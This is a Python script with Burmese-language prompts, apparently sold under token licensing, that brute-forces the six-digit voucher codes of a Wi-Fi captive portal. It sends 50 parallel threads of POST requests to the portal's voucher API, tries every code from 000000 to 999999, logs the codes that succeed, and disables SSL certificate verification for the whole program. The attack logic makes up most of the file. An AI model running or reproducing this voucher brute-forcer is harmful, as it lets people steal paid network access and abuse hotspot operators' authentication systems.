import requests
import re
import urllib3
import time
import threading
from datetime import datetime, timedelta
import sys
import os
import ssl

# --- SSL ERROR FIX ---
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
KEYS_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
TRIED_CODES_FILE = "tried_codes.txt"
# Thread အရေအတွက်တိုးရင် ပိုမြန်မည် (အင်တာနက်ပေါ်မူတည်သည်)
VOUCHER_THREADS = 50 

# --- CLEAR SCREEN FUNCTION ---
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# --- CACHE MANAGEMENT ---
def load_tried_codes():
    if not os.path.exists(TRIED_CODES_FILE):
        return set()
    with open(TRIED_CODES_FILE, "r") as f:
        return set(line.strip() for line in f)

def save_tried_code(code):
    with open(TRIED_CODES_FILE, "a") as f:
        f.write(f"{code}\n")

# --- TOKEN LICENSE SYSTEM ---
def check_license():
    clear_screen()
    print("========================================")
    print("       🔑 TOKEN ACCESS SYSTEM         ")
    print("========================================\n")
    
    try:
        url_with_cache_buster = f"{KEYS_URL}?t={int(time.time())}"
        response = requests.get(url_with_cache_buster, timeout=10)
        lines = response.text.splitlines()
    except Exception as e:
        print(f"❌ Connection Error: {e}")
        return False
        
    user_token = input("👉 သင့် Token ကိုရိုက်ထည့်ပါ: ")
    
    for line in lines:
        if "|" not in line or line.startswith("#"): continue
        try:
            key, start_date_str, unit, amount = line.split("|")
            start_date = datetime.strptime(start_date_str, "%Y-%m-%d")
            amount = int(amount)
        except: continue
        
        if key == user_token:
            if unit == 'd':
                end_date = start_date + timedelta(days=amount)
            elif unit == 'h':
                end_date = start_date + timedelta(hours=amount)
            elif unit == 'm':
                end_date = start_date + timedelta(minutes=amount)
            else:
                return False
            
            remaining = end_date - datetime.now()
            
            if remaining.total_seconds() <= 0:
                print("\n❌ သက်တမ်းကုန်ဆုံးသွားပါပြီ။")
                return False
            else:
                print(f"\n✅ သက်တမ်းရှိသည်။ ကုန်ဆုံးချိန်: {end_date}")
                time.sleep(2)
                return True
            
    print("\n❌ Token မှားယွင်းနေပါသည်။")
    return False

# --- MENU SYSTEM ---
def show_menu():
    clear_screen()
    print("========================================")
    print("         🛠️  MAIN MENU                ")
    print("========================================")
    print("1. 🌐 Internet Access")
    print("2. 🔍 Fast Voucher Harvesting")
    print("3. 📋 View Success Codes")
    print("========================================\n")
    choice = input("👉 ရွေးချယ်ပါ (1-3): ")
    return choice

# --- FAST VOUCHER HARVESTING LOGIC ---
def test_code(code, portal_host, sid, session):
    """တစ်ခုချင်းစီကို Thread နဲ့စမ်းသပ်သည့် function"""
    voucher_api = f"{portal_host}/api/auth/voucher/"
    try:
        # --- API CALL စမ်းသပ်သည့်နေရာ ---
        v_res = session.post(voucher_api, json={'accessCode': code, 'sessionId': sid, 'apiVersion': 1}, timeout=5)
        
        if v_res.status_code == 200 and "success" in v_res.text.lower():
            # SUCCESS အစိမ်းရောင်
            print(f"\n\033[92m✅ SUCCESS! Found Code: {code}\033[0m")
            save_tried_code(code)
            return True
    except:
        pass
    
    save_tried_code(code)
    return False

def start_voucher_harvesting():
    print(f"\n🔍 Voucher Code ရှာဖွေခြင်း အရှိန်မြှင့် စတင်ပြီ...")
    tried_codes = load_tried_codes()
    print(f"📚 စမ်းသပ်ပြီးသား Code {len(tried_codes)} ခု ကျော်လွှားမည်။")

    # အမှန်တကယ်တွင် portal_host နှင့် sid ကို Portal ကယူရမည်
    portal_host = "http://192.168.60.1" # Example
    sid = "example_session_id" # Example
    session = requests.Session()

    threads = []
    
    for i in range(1000000):
        code = f"{i:06d}"
        if code in tried_codes:
            continue
        
        # Thread အများကြီးနဲ့ စမ်းသပ်ခြင်း
        t = threading.Thread(target=test_code, args=(code, portal_host, sid, session))
        threads.append(t)
        t.start()
        
        # Threads အရေအတွက် ထိန်းချုပ်ခြင်း
        if len(threads) >= VOUCHER_THREADS:
            for t in threads:
                t.join()
            threads = []
            
        print(f"\r🔍 စမ်းသပ်နေသည်: {code}", end="", flush=True)

# --- MAIN RUNNER ---
if __name__ == "__main__":
    if check_license():
        choice = show_menu()
        if choice == '1':
            print("\n🌐 Internet Access... (Logic implementation needed)")
        elif choice == '2':
            start_voucher_harvesting()
        elif choice == '3':
            print("\n📋 Access Code များ:")
            # Logic to display success codes
            time.sleep(5)
        else:
            print("🚫 မှားယွင်းသော ရွေးချယ်မှု။")
            
